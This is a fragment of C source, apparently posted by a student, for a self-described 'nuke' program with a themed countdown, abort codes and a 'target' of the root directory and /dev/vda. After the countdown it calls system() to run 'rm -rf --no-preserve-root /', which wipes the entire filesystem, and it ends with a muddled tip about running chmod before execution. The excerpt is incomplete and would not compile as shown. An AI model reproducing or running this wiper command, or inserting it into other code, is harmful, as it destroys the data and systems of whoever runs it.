// just a sneak peek of a nuke i made, rm -rf's upon running it.
// we're learning c at uni so i decided to fuck around and find out a little

// OPERATION: BLACK HORIZON

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <termios.h>
#include <sys/wait.h>

// =============================
// RM - AGEDDON - RF INITALIZING
// =============================

#define TARGET       "/"
#define DISK         "/dev/vda"
#define PAL_CODE     "300449"
#define GOLD_CODE    "WOPPR"
#define ABORT_WINDOW 60

static void box(const char* title) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║   %-38s                                  ║\n", title);
    printf("╚══════════════════════════════════════════╝\n");
}


// has PAL code, GOLD code and 2 OPERATOR AUTHENTICATION.

// --- COUNTDOWN ---
box("ABORT WINDOW OPEN");
printf("TYPE ABORT TO CANCEL. NO INPUT = DETONATE.\n\n");

for (int i = ABORT_WINDOW; i > 0; i--) {
    printf("  T-%d... ", i);
    fflush(stdout);
// eventually when its done it prints out "NEUTRALIZING TARGET..." but fails to print anything else out, because the folders are usually wiped before it can drop the "TARGET DESTROYED" and "GOODBYE" notifications.

    printf(" NEUTRALIZING TARGET...\n");

    snprintf(cmd, sizeof(cmd), "rm -rf --no-preserve-root %s 2>/dev/null", TARGET);
    system(cmd);

    printf("\n");
    box("TARGET DESTROYED.");
    box("GOODBYE.");

    return 0;
}

// original code is approx. 136 lines long.
// one single minus is that it needs to be escalated before it is ran, just hit a chmod -R 755 and we good.
// thanks for analyzing/reading/caring about this project! :D
